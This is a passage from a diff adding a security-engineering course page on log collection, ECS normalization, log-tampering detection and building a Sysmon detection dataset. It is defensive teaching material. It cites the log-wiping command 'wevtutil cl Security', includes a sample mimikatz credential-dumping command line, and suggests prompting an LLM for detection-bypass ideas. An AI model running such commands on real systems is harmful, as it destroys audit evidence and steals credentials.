+<p>Data engineering analogy: this is exactly a Kafka producer → broker → consumer pipeline. The agent is the producer, the SIEM is the consumer, and the transport is the broker.</p>
+<p><strong>Example:</strong></p>
+<pre><code># Winlogbeat config (winlogbeat.yml) — collect Security + Sysmon
+winlogbeat.event_logs:
+  - name: Security
+    event_id: 4624, 4625, 4648, 4688, 4720, 4728
+    level: information
+  - name: Microsoft-Windows-Sysmon/Operational
+    event_id: 1, 3, 7, 8, 10, 11, 22
+
+output.elasticsearch:
+  hosts: [&quot;https://elasticsearch:9200&quot;]
+  username: &quot;${ES_USER}&quot;
+  password: &quot;${ES_PASSWORD}&quot;
+  ssl.certificate_authorities: [&quot;/etc/pki/root/ca.pem&quot;]
+
+processors:
+  - add_host_metadata: ~
+  - add_cloud_metadata: ~
+</code></pre><p><strong>Exercise:</strong>
+Write a Python function <code>validate_winlogbeat_config(config: dict) -&gt; list[str]</code> that checks: (1) output.elasticsearch hosts is non-empty, (2) at least one event_log is configured, (3) no plaintext passwords in output section (key &quot;password&quot; must reference a variable like <code>${...}</code>). Return a list of validation error strings; empty list = valid.
+Expected output: <code>[]</code> for a valid config, or a list like <code>[&quot;missing elasticsearch hosts&quot;, &quot;plaintext password detected&quot;]</code></p>
+<hr />
+<h3>Concept 2 — Log Normalization and ECS</h3>
+<p>Raw logs from different sources use different field names for the same concept. A Windows logon event calls the user <code>TargetUserName</code>. A Linux SSH event calls it <code>user</code>. A firewall event calls it <code>src_user</code>. A SIEM needs a <strong>common schema</strong> to query across all sources with a single field name.</p>
+<p><strong>Elastic Common Schema (ECS)</strong> is the most widely adopted normalization standard:</p>
+<ul>
+<li><code>event.action</code> — what happened (user-logon, file-create, dns-query)</li>
+<li><code>event.category</code> — high-level category (authentication, network, file)</li>
+<li><code>source.ip</code> / <code>destination.ip</code> — IPs</li>
+<li><code>user.name</code> — the user</li>
+<li><code>process.name</code> / <code>process.command_line</code> — process info</li>
+<li><code>host.hostname</code> — the endpoint</li>
+</ul>
+<p>Think of ECS as the dbt staging layer: raw source data mapped to a consistent schema so downstream queries don't care about source differences.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>def normalize_windows_logon(raw: dict) -&gt; dict:
+    &quot;&quot;&quot;Map Windows 4624 event fields to ECS.&quot;&quot;&quot;
+    return {
+        &quot;event.action&quot;: &quot;user-logon&quot;,
+        &quot;event.category&quot;: &quot;authentication&quot;,
+        &quot;event.outcome&quot;: &quot;success&quot;,
+        &quot;event.code&quot;: str(raw.get(&quot;EventID&quot;, &quot;&quot;)),
+        &quot;user.name&quot;: raw.get(&quot;TargetUserName&quot;, &quot;&quot;),
+        &quot;user.domain&quot;: raw.get(&quot;TargetDomainName&quot;, &quot;&quot;),
+        &quot;source.ip&quot;: raw.get(&quot;IpAddress&quot;, &quot;&quot;),
+        &quot;host.hostname&quot;: raw.get(&quot;Computer&quot;, &quot;&quot;),
+        &quot;winlog.logon.type&quot;: raw.get(&quot;LogonType&quot;, &quot;&quot;),
+    }
+
+raw_event = {
+    &quot;EventID&quot;: 4624,
+    &quot;TargetUserName&quot;: &quot;jsmith&quot;,
+    &quot;TargetDomainName&quot;: &quot;CORP&quot;,
+    &quot;IpAddress&quot;: &quot;192.168.1.50&quot;,
+    &quot;Computer&quot;: &quot;WORKSTATION-01&quot;,
+    &quot;LogonType&quot;: &quot;3&quot;,
+}
+print(normalize_windows_logon(raw_event))
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write <code>normalize_linux_ssh(raw_line: str) -&gt; dict</code> that parses a syslog SSH accepted line (format: <code>&quot;Mar 15 08:23:41 server01 sshd[1234]: Accepted publickey for deploy from 10.0.1.20 port 52341&quot;</code>) and maps it to ECS fields: event.action, event.category, event.outcome, user.name, source.ip, host.hostname.
+Expected output: ECS dict with 6 keys populated from the parsed line</p>
+<hr />
+<h3>Concept 3 — Log Integrity and Tampering Detection</h3>
+<p>Attackers who gain admin access to a compromised host will attempt to delete or modify logs to cover their tracks. Windows Event Log can be cleared with <code>wevtutil cl Security</code> — and that clearing itself generates Event ID 1102. Linux syslog can be overwritten or truncated.</p>
+<p>Defenses:</p>
+<ol>
+<li><strong>Forward logs off-host immediately</strong> — once in a SIEM, clearing the local log doesn't matter</li>
+<li><strong>Monitor for Event ID 1102</strong> (Security log cleared) and <strong>Event ID 104</strong> (System log cleared)</li>
+<li><strong>Monitor for log size decreases</strong> — a shrinking log file is suspicious</li>
+<li><strong>Use auditd write-protection rules</strong> to detect writes to <code>/var/log/auth.log</code></li>
+</ol>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>def detect_log_clearing_events(events: list[dict]) -&gt; list[dict]:
+    &quot;&quot;&quot;Identify Windows log-clearing events.&quot;&quot;&quot;
+    LOG_CLEAR_IDS = {
+        1102: &quot;security_log_cleared&quot;,
+        104: &quot;system_log_cleared&quot;,
+    }
+    alerts = []
+    for e in events:
+        eid = e.get(&quot;EventID&quot;)
+        if eid in LOG_CLEAR_IDS:
+            alerts.append({
+                &quot;alert&quot;: LOG_CLEAR_IDS[eid],
+                &quot;timestamp&quot;: e.get(&quot;TimeCreated&quot;),
+                &quot;user&quot;: e.get(&quot;SubjectUserName&quot;),
+                &quot;host&quot;: e.get(&quot;Computer&quot;),
+                &quot;severity&quot;: &quot;HIGH&quot;,
+            })
+    return alerts
+
+events = [
+    {&quot;EventID&quot;: 4624, &quot;TimeCreated&quot;: &quot;2024-03-15T08:00:00Z&quot;, &quot;Computer&quot;: &quot;WS-01&quot;},
+    {&quot;EventID&quot;: 1102, &quot;TimeCreated&quot;: &quot;2024-03-15T08:05:00Z&quot;, &quot;Computer&quot;: &quot;WS-01&quot;, &quot;SubjectUserName&quot;: &quot;attacker&quot;},
+]
+print(detect_log_clearing_events(events))
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Extend <code>detect_log_clearing_events</code> to also check whether the clearing event is within 5 minutes of a failed logon (EventID 4625) from the same host. If so, set <code>&quot;context&quot;: &quot;preceded_by_failed_logon&quot;</code>. Implement <code>correlate_clearing_with_failures(events: list[dict]) -&gt; list[dict]</code>.
+Expected output: alert dict with context field set when temporal correlation is found</p>
+<hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs can generate log normalization mappings between arbitrary source schemas and ECS.
+<strong>Threat:</strong> Attackers using legitimate cloud services (Teams, OneDrive) for C2 generate logs that look identical to normal traffic — normalization alone doesn't help.
+<strong>Opportunity:</strong> Give an LLM a sample of raw firewall logs and ask it to produce a Python normalization function that maps to ECS. Saves hours of field mapping work.
+<strong>Prompt to try:</strong> <code>&quot;Here are 5 sample log lines from [vendor] firewall. Write a Python function that parses each line and maps the fields to Elastic Common Schema (ECS). Use regex for parsing and return a dict per line.&quot;</code></p>
+<hr />
+<h2 id="day-5">Day 5 — Building a Detection Dataset from Sysmon</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="08-5"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=oRnzUxM35EI" target="_blank" rel="noopener"><b>Challenge - Log Analysis With Sysmon</b><small>InfoSec_Bret</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=Sysmon%20log%20analysis%20Python%20pandas%20detection%20dataset" target="_blank" rel="noopener">Sysmon log analysis Python pandas detection dataset</a></p></div>
+<hr />
+<h3>Concept 1 — Loading Sysmon Logs into Python</h3>
+<p>For local analysis and rule development, loading Sysmon XML exports into a Pandas DataFrame is the fastest workflow. <code>python-evtx</code> parses <code>.evtx</code> files; <code>lxml</code> parses the XML payload of each record.</p>
+<p>The output is a flat tabular structure where each row is one event and each column is a field. This is the foundation for the Royal Road Standard this week: a normalized Parquet detection dataset.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import pandas as pd
+import json
+
+# Simulate Sysmon EventID 1 records (ProcessCreate) as parsed dicts
+SYSMON_SAMPLE = [
+    {
+        &quot;EventID&quot;: 1,
+        &quot;UtcTime&quot;: &quot;2024-03-15 08:23:41.445&quot;,
+        &quot;Image&quot;: &quot;C:\\Windows\\System32\\cmd.exe&quot;,
+        &quot;CommandLine&quot;: &quot;cmd.exe /c whoami&quot;,
+        &quot;ParentImage&quot;: &quot;C:\\Windows\\System32\\powershell.exe&quot;,
+        &quot;User&quot;: &quot;CORP\\jsmith&quot;,
+        &quot;IntegrityLevel&quot;: &quot;High&quot;,
+        &quot;Hashes&quot;: &quot;SHA256=A4B7C2&quot;,
+        &quot;ProcessId&quot;: &quot;4512&quot;,
+    },
+    {
+        &quot;EventID&quot;: 1,
+        &quot;UtcTime&quot;: &quot;2024-03-15 08:23:42.001&quot;,
+        &quot;Image&quot;: &quot;C:\\Temp\\mimikatz.exe&quot;,
+        &quot;CommandLine&quot;: &quot;mimikatz.exe privilege::debug sekurlsa::logonpasswords&quot;,
+        &quot;ParentImage&quot;: &quot;C:\\Windows\\System32\\cmd.exe&quot;,
+        &quot;User&quot;: &quot;CORP\\jsmith&quot;,
+        &quot;IntegrityLevel&quot;: &quot;High&quot;,
+        &quot;Hashes&quot;: &quot;SHA256=DEAD01&quot;,
+        &quot;ProcessId&quot;: &quot;4513&quot;,
+    },
+]
+
+df = pd.DataFrame(SYSMON_SAMPLE)
+df[&quot;UtcTime&quot;] = pd.to_datetime(df[&quot;UtcTime&quot;])
+print(df.dtypes)
+print(df[[&quot;UtcTime&quot;, &quot;Image&quot;, &quot;CommandLine&quot;]].to_string())
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Using <code>SYSMON_SAMPLE</code>, write a function <code>load_sysmon_to_df(records: list[dict]) -&gt; pd.DataFrame</code> that (1) converts to DataFrame, (2) parses UtcTime as datetime, (3) extracts the filename from Image as a new column <code>process_name</code> (just the basename, e.g., <code>cmd.exe</code>). Return the DataFrame.
+Expected output: DataFrame with original columns plus <code>process_name</code>; UtcTime is datetime dtype</p>
+<hr />
+<h3>Concept 2 — Feature Engineering for Detection</h3>
+<p>Raw Sysmon fields are good, but derived features make detections more powerful. Detection engineers add computed columns that capture suspicious patterns:</p>
+<ul>
+<li><strong>command_line_length</strong> — unusually long command lines suggest encoded payloads</li>
+<li><strong>is_temp_path</strong> — process running from <code>%TEMP%</code>, <code>C:\Temp</code>, <code>C:\Windows\Temp</code></li>
+<li><strong>is_encoded</strong> — command line contains <code>-EncodedCommand</code> or <code>-enc</code></li>
+<li><strong>parent_child_unusual</strong> — known unusual parent-child pairs (Word spawning cmd.exe)</li>
+<li><strong>integrity_high_non_admin</strong> — High integrity process run by non-admin user</li>
+</ul>
+<p>These features become columns in the detection dataset and feed directly into detection rules or ML models.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>def add_detection_features(df: pd.DataFrame) -&gt; pd.DataFrame:
+    df = df.copy()
+    df[&quot;cmd_length&quot;] = df[&quot;CommandLine&quot;].str.len()
+    df[&quot;is_temp_path&quot;] = df[&quot;Image&quot;].str.lower().str.contains(r&quot;\\temp\\|\\tmp\\&quot;, regex=True)
+    df[&quot;is_encoded_cmd&quot;] = df[&quot;CommandLine&quot;].str.lower().str.contains(
+        r&quot;-encodedcommand|-enc\s&quot;, regex=True
+    )
+    df[&quot;process_name&quot;] = df[&quot;Image&quot;].str.split(&quot;\\&quot;).str[-1].str.lower()
+    df[&quot;parent_name&quot;] = df[&quot;ParentImage&quot;].str.split(&quot;\\&quot;).str[-1].str.lower()
+    df[&quot;suspicious_parent&quot;] = df.apply(
+        lambda r: r[&quot;process_name&quot;] in {&quot;cmd.exe&quot;, &quot;powershell.exe&quot;}
+        and r[&quot;parent_name&quot;] in {&quot;winword.exe&quot;, &quot;excel.exe&quot;, &quot;outlook.exe&quot;},
+        axis=1
+    )
+    return df
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Apply <code>add_detection_features</code> to <code>SYSMON_SAMPLE</code> from Concept 1. Then write <code>score_events(df: pd.DataFrame) -&gt; pd.DataFrame</code> that adds a <code>risk_score</code> column: +1 for each of: is_temp_path, is_encoded_cmd, suspicious_parent, cmd_length &gt; 100. Return df sorted by risk_score descending.
+Expected output: DataFrame with risk_score column; mimikatz.exe row should score highest</p>
+<hr />
+<h3>Concept 3 — Writing the Detection Dataset to Parquet</h3>
+<p>Parquet is the standard format for analytical detection datasets. It's columnar (fast range scans on EventID, timestamp), compressed (10x smaller than CSV for log data), and schema-aware (timestamp types preserved).</p>
+<p>The normalized Parquet file this week is the Royal Road output — it will be queried in W09 (KQL translation), enriched in W10 (detection-as-code), and extended in W11 (behavioral analytics).</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import pandas as pd
+import pyarrow as pa
+import pyarrow.parquet as pq
+from pathlib import Path
+
+def write_detection_dataset(df: pd.DataFrame, output_path: str) -&gt; None:
+    &quot;&quot;&quot;Write normalized Sysmon DataFrame to Parquet with schema enforcement.&quot;&quot;&quot;
+    schema = pa.schema([
+        pa.field(&quot;EventID&quot;, pa.int32()),
+        pa.field(&quot;UtcTime&quot;, pa.timestamp(&quot;us&quot;)),
+        pa.field(&quot;Image&quot;, pa.string()),
+        pa.field(&quot;CommandLine&quot;, pa.string()),
+        pa.field(&quot;ParentImage&quot;, pa.string()),
+        pa.field(&quot;User&quot;, pa.string()),
+        pa.field(&quot;IntegrityLevel&quot;, pa.string()),
+        pa.field(&quot;Hashes&quot;, pa.string()),
+        pa.field(&quot;ProcessId&quot;, pa.string()),
+        pa.field(&quot;process_name&quot;, pa.string()),
+        pa.field(&quot;cmd_length&quot;, pa.int32()),
+        pa.field(&quot;is_temp_path&quot;, pa.bool_()),
+        pa.field(&quot;is_encoded_cmd&quot;, pa.bool_()),
+        pa.field(&quot;risk_score&quot;, pa.int32()),
+    ])
+    table = pa.Table.from_pandas(df, schema=schema, preserve_index=False)
+    pq.write_table(table, output_path, compression=&quot;snappy&quot;)
+    print(f&quot;Wrote {len(df)} records to {output_path}&quot;)
+
+def read_detection_dataset(path: str) -&gt; pd.DataFrame:
+    return pq.read_table(path).to_pandas()
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write a complete <code>build_detection_dataset(records: list[dict], output_path: str) -&gt; pd.DataFrame</code> function that: (1) calls <code>load_sysmon_to_df</code>, (2) calls <code>add_detection_features</code>, (3) calls <code>score_events</code>, (4) calls <code>write_detection_dataset</code>. Then reads back and returns the DataFrame from Parquet to verify round-trip.
+Expected output: DataFrame loaded from Parquet; print statement shows row count; all columns present</p>
+<hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs can suggest feature engineering ideas for detection datasets given a description of known attack patterns.
+<strong>Threat:</strong> Adversaries who know your feature set craft commands that score low on every feature — staying below detection thresholds by design.
+<strong>Opportunity:</strong> Ask an LLM to review your feature set and suggest adversarial bypass scenarios, then use those to improve your features.
+<strong>Prompt to try:</strong> <code>&quot;Here is a Python detection feature engineering function for Sysmon ProcessCreate events. For each feature, describe how an attacker could craft a process creation event that scores 0 on that feature while still achieving code execution. Then suggest one additional feature that would catch the bypass.&quot;</code></p>
+<hr />
+<h2>Royal Road Standard — Week 08</h2>
+<p><strong>Task:</strong> Build a normalized Sysmon detection dataset in Parquet format from raw event records.
+<strong>Builds on:</strong> W07 CTI IOC database (will be used for IOC enrichment in W09)
+<strong>Deliverable:</strong> <code>detection_dataset/sysmon_detections.parquet</code> — a Parquet file with engineered features and risk scores derived from Sysmon EventID 1 (ProcessCreate) records.</p>
+<p>Script outline:</p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code># build_dataset.py
+import pandas as pd
+import pyarrow.parquet as pq
+
+SYSMON_SAMPLE = [...]  # paste records from Day 5
+
+df = load_sysmon_to_df(SYSMON_SAMPLE)
+df = add_detection_features(df)
+df = score_events(df)
+write_detection_dataset(df, &quot;detection_dataset/sysmon_detections.parquet&quot;)
+
+# Verify
+df_check = read_detection_dataset(&quot;detection_dataset/sysmon_detections.parquet&quot;)
+print(df_check[[&quot;process_name&quot;, &quot;risk_score&quot;]].sort_values(&quot;risk_score&quot;, ascending=False))
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Stretch goal:</strong> Add an IOC enrichment step that JOINs the Parquet dataset against the W07 SQLite IOC database on the SHA256 hash field. Flag any process whose hash matches a known-malicious IOC. Write the enriched result to <code>sysmon_detections_enriched.parquet</code>.</p>
+<div class="pager"><a class="btn ghost" href="week-07.html">&larr; Week 07</a><a class="btn ghost" href="week-09.html">Week 09 &rarr;</a></div>
+</main></body></html>
